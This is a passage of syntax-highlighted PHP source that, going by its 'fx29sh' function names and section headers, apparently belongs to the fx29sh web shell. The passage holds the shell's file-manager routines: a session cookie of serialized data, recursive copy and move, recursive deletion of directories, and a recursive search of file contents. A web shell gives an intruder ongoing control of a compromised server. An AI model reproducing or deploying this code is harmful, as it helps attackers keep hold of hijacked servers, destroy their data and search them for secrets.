<span class="lineno">2789</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2790</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">2791</span>     <span class="p">}</span>
<span class="lineno">2792</span>   <span class="p">}</span>
<span class="lineno">2793</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2794</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2795</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">2796</span>     <span class="p">}</span>
<span class="lineno">2797</span>   <span class="p">}</span>
<span class="lineno">2798</span> <span class="p">}</span>
<span class="lineno">2799</span> <span class="k">function</span> <span class="nf">fx29_sess_put</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2800</span>   <span class="k">global</span> <span class="nv">$sess_cookie</span><span class="p">;</span>
<span class="lineno">2801</span>   <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
<span class="lineno">2802</span>   <span class="nx">fx29_buff_prepare</span><span class="p">();</span>
<span class="lineno">2803</span>   <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
<span class="lineno">2804</span>   <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno">2805</span>   <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$sess_cookie</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno">2806</span> <span class="p">}</span>
<span class="lineno">2807</span> <span class="c1">###[ FILESYSTEM FUNCTIONS ]###</span>
<span class="lineno">2808</span> <span class="k">function</span> <span class="nf">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2809</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2810</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2811</span>   <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2812</span>   <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2813</span>     <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2814</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2815</span>       <span class="k">else</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2816</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno">2817</span>     <span class="p">}</span>
<span class="lineno">2818</span>   <span class="p">}</span>
<span class="lineno">2819</span>   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2820</span>   <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">2821</span> <span class="p">}</span>
<span class="lineno">2822</span> <span class="k">function</span> <span class="nf">fs_copy_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2823</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2824</span>   <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno">2825</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">)))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">));}</span>
<span class="lineno">2826</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2827</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2828</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2829</span>     <span class="k">return</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno">2830</span>   <span class="p">}</span>
<span class="lineno">2831</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2832</span>   <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2833</span> <span class="p">}</span>
<span class="lineno">2834</span> <span class="k">function</span> <span class="nf">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2835</span>   <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2836</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="p">);}</span>
<span class="lineno">2837</span>   <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2838</span>     <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2839</span>       <span class="nv">$ret</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">2840</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2841</span>       <span class="k">else</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">)</span> <span class="k">and</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="lineno">2842</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno">2843</span>      <span class="p">}</span>
<span class="lineno">2844</span>    <span class="p">}</span>
<span class="lineno">2845</span>   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2846</span>   <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">2847</span> <span class="p">}</span>
<span class="lineno">2848</span> <span class="k">function</span> <span class="nf">fs_move_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2849</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2850</span>   <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno">2851</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2852</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2853</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2854</span>     <span class="k">return</span> <span class="nx">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno">2855</span>   <span class="p">}</span>
<span class="lineno">2856</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2857</span>     <span class="k">if</span><span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
<span class="lineno">2858</span>     <span class="k">else</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno">2859</span>   <span class="p">}</span>
<span class="lineno">2860</span>   <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno">2861</span> <span class="p">}</span>
<span class="lineno">2862</span> <span class="k">function</span> <span class="nf">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2863</span>   <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2864</span>   <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2865</span>     <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2866</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2867</span>       <span class="k">else</span> <span class="p">{</span><span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span> <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2868</span>     <span class="p">}</span>
<span class="lineno">2869</span>   <span class="p">}</span>
<span class="lineno">2870</span>   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2871</span>   <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2872</span>   <span class="k">return</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2873</span> <span class="p">}</span>
<span class="lineno">2874</span> <span class="k">function</span> <span class="nf">fs_rmobj</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2875</span>   <span class="nv">$o</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
<span class="lineno">2876</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2877</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$o</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2878</span>     <span class="k">return</span> <span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
<span class="lineno">2879</span>   <span class="p">}</span>
<span class="lineno">2880</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno">2881</span>   <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno">2882</span> <span class="p">}</span>
<span class="lineno">2883</span> <span class="c1">###[ END FILESYSTEM FUNCTIONS ]###</span>
<span class="lineno">2884</span> <span class="c1">###[ FX29SH EXIT FUNCTIONS ]###</span>
<span class="lineno">2885</span> <span class="k">function</span> <span class="nf">fx29shexit</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2886</span>   <span class="k">global</span> <span class="nv">$gzipencode</span><span class="p">,</span><span class="nv">$ft</span><span class="p">;</span>
<span class="lineno">2887</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">headers_sent</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$gzipencode</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ft</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;img&quot;</span><span class="p">,</span><span class="s2">&quot;download&quot;</span><span class="p">,</span><span class="s2">&quot;notepad&quot;</span><span class="p">)))</span> <span class="p">{</span>
<span class="lineno">2888</span>     <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
<span class="lineno">2889</span>     <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
<span class="lineno">2890</span>     <span class="o">@</span><span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzHandler&quot;</span><span class="p">);</span>
<span class="lineno">2891</span>     <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span>
<span class="lineno">2892</span>     <span class="o">@</span><span class="nb">ob_end_flush</span><span class="p">();</span>
<span class="lineno">2893</span>   <span class="p">}</span>
<span class="lineno">2894</span>   <span class="k">exit</span><span class="p">;</span>
<span class="lineno">2895</span> <span class="p">}</span>
<span class="lineno">2896</span> <span class="c1">###[ END OF FX29SH EXIT FUNCTIONS ]###</span>
<span class="lineno">2897</span> <span class="k">function</span> <span class="nf">fx29fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2898</span>   <span class="k">global</span> <span class="nv">$found</span><span class="p">,</span> <span class="nv">$found_d</span><span class="p">,</span> <span class="nv">$found_f</span><span class="p">,</span> <span class="nv">$search_i_f</span><span class="p">,</span> <span class="nv">$search_i_d</span><span class="p">,</span> <span class="nv">$a</span><span class="p">;</span>
<span class="lineno">2899</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">2900</span>   <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2901</span>   <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2902</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2903</span>       <span class="nv">$bool</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">]</span> <span class="k">and</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span><span class="nv">$f</span><span class="p">));</span>
<span class="lineno">2904</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2905</span>         <span class="nv">$search_i_d</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">2906</span>         <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;}</span>
<span class="lineno">2907</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nx">fx29fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2908</span>       <span class="p">}</span>
<span class="lineno">2909</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2910</span>         <span class="nv">$search_i_f</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">2911</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2912</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">2913</span>             <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">2914</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_wwo&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;}</span>
<span class="lineno">2915</span>             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_cs&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}</span>
<span class="lineno">2916</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_regexp&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);}</span>
<span class="lineno">2917</span>             <span class="k">else</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);}</span>
<span class="lineno">2918</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_not&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;}</span>
<span class="lineno">2919</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
<span class="lineno">2920</span>           <span class="p">}</span>
<span class="lineno">2921</span>           <span class="k">else</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
<span class="lineno">2922</span>         <span class="p">}</span>
<span class="lineno">2923</span>       <span class="p">}</span>
<span class="lineno">2924</span>     <span class="p">}</span>
<span class="lineno">2925</span>   <span class="p">}</span>
<span class="lineno">2926</span>   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2927</span> <span class="p">}</span>
